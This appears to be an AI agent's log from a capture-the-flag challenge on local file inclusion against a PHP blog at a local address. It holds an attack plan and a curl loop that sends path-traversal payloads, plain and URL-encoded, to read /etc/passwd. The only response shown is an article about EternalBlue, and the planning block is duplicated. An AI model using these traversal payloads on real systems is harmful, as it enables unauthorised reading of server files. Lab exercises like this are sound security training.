SURFACE: /index.php (page param pagination), /about.php, /contact.php, /post.php?id=, static/images; common /robots.txt,/api,/admin,/debug,/healthz,/login(.php) 404. BUG-HYP: /post.php?id= includes/reads a PHP content file by name; hrefs show direct file-like ids such as EternalBlue.php. Suspect LFI/path traversal via id parameter. WHY: index HTML generated post links with id=EternalBlue.php etc and challenge category is LFI; stack is PHP where include($_GET['id']) is common; X-Powered-By PHP/7.4.33. PLAN: - HYPOTHESIS: post.php?id is a local include/read primitive (evidence: links contain PHP filenames in id param). - ATTACK CHAIN: confirm normal post -> path traversal to /etc/passwd -> use php://filter to read PHP source/config -> locate flag path or escalate to log/php-wrapper RCE -> read flag. - FIRST PROBE: curl -is 'http://127.0.0.1:9100/post.php?id=EternalBlue.php' and traversal variants for /etc/passwd. - ABANDON IF: id is strictly whitelisted or responses for distinct ids are identical with no include errors/reflection after traversal/wrapper tests. TXT base=http://127.0.0.1:9100 for u in "$base/post.php?id=EternalBlue.php" "$base/post.php?id=../../../../etc/passwd" "$base/post.php?id=....//....//....//....//etc/passwd" "$base/post.php?id=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"; do echo "===== $u ====="; curl -is --max-time 5 "$u"; echo; done STACK: Apache/2.4.54 (Debian) + PHP/7.4.33, likely simple PHP blog; no local source files in task_files. SURFACE: /index.php (page param pagination), /about.php, /contact.php, /post.php?id=, static/images; common /robots.txt,/api,/admin,/debug,/healthz,/login(.php) 404. BUG-HYP: /post.php?id= includes/reads a PHP content file by name; hrefs show direct file-like ids such as EternalBlue.php. Suspect LFI/path traversal via id parameter. WHY: index HTML generated post links with id=EternalBlue.php etc and challenge category is LFI; stack is PHP where include($_GET['id']) is common; X-Powered-By PHP/7.4.33. PLAN: - HYPOTHESIS: post.php?id is a local include/read primitive (evidence: links contain PHP filenames in id param). - ATTACK CHAIN: confirm normal post -> path traversal to /etc/passwd -> use php://filter to read PHP source/config -> locate flag path or escalate to log/php-wrapper RCE -> read flag. - FIRST PROBE: curl -is 'http://127.0.0.1:9100/post.php?id=EternalBlue.php' and traversal variants for /etc/passwd. - ABANDON IF: id is strictly whitelisted or responses for distinct ids are identical with no include errors/reflection after traversal/wrapper tests. ===== http://127.0.0.1:9100/post.php?id=EternalBlue.php ===== HTTP/1.1 200 OK Date: Thu, 18 Jun 2026 14:05:36 GMT Server: Apache/2.4.54 (Debian) X-Powered-By: PHP/7.4.33 Vary: Accept-Encoding Content-Length: 7322 Content-Type: text/html; charset=UTF-8 Encoder64 Blog | EternalBlue: Understanding the Exploit

Encoder64 Blog
Home About Contact

EternalBlue: Understanding the Exploit

Understanding the Exploit

Back to Home

Introduction to EternalBlue

EternalBlue is a cyberattack exploit developed by the U.S. National Security Agency (NSA). It targets a vulnerability in Microsoft's implementation of the Server Message Block (SMB) protocol. This exploit became widely known when it was leaked by a group called the Shadow Brokers in April 2017.

Technical Overview

The exploit takes advantage of a vulnerability in Windows systems in the SMBv1 server (MS17-010). By sending specially crafted packets, it is able to execute arbitrary code on the target machine, allowing full access. This is typically the first step in a multi-layered attack strategy that includes deploying ransomware or other malicious payloads.

Impact on Global Cybersecurity

After the leak, EternalBlue was used to launch extensive cyberattacks, including the infamous WannaCry ransomware attack in May 2017. This attack affected over 200,000 computers across 150 countries, with total damages ranging into the billions of dollars. The exploit's ability to spread within networks without user interaction makes it particularly dangerous and effective as a tool for rapid dissemination of malware.

Legacy and Continued Relevance

Despite patches being released by Microsoft, many unpatched systems are still vulnerable to EternalBlue, and it remains in use by cybercriminals. The legacy of EternalBlue highlights the importance of regular system updates and the potential dangers of stockpiling cyber weapons.
